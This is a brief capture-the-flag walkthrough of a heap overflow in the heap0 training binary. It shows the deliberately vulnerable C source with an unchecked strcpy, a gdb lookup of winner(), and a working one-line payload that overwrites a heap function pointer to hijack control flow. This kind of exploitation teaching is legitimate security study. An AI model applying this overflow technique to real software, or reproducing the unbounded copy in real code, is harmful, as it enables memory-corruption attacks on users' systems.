Let’s take a look at the C code…

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

Ok looking at this program, we can tell that it essentially takes in data as an argument, uses malloc (which allocates memory for some data and returns the address) on two variables with one of them holding the argument, prints the addresses, and executes the other variable’s data as a memory address. 

Now we can override the second variable's address to that of the winner() function. However we need to know the distance between the two variables. Luckily the program saves us a bit of work and just prints 

```
$ ./heap0 guy
Data is at 0x804a008, fp is at 0x804a050
Level has not been passed
```

So from looking at that, we can subtract the two memory address and get the total space between them.

0x804a050 - 0x804a008 = 72

So now that we know the space, we just need to know what address to overwrite it with. We know we want to execute the winner() function, but to get the address we can use gdb.

```
gdb ./heap0
print winner
$1 = {void (void)} 0x8048464 <winner>
```

And just like that we have the address, of course we will need to put it in least endian. So let’s try to deliver our payload to the program and see if we can pwn it.

```
$ ./heap0 `python -c ‘print “1”*72 + “\x64\x84\x04\x08”’`
data is at 0x804a008, fp is at 0x804a050
level passed
```

And just like that we pwn the program.

https://docs.google.com/document/d/19f8jvFfdwd-x6ibzWj0qqoa46OUf7Q-houCD-2-xJPk/edit?usp=sharing
